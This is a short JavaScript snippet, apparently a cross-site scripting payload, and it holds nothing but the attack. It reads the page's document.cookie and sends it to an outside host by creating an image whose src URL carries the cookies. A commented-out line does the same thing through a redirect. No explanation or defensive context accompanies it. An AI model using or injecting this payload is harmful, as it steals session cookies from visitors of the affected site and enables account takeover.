// document.location = "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie;
(() => {
  const x = new Image();
  x.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie);
  document.body.appendChild(x);
})();
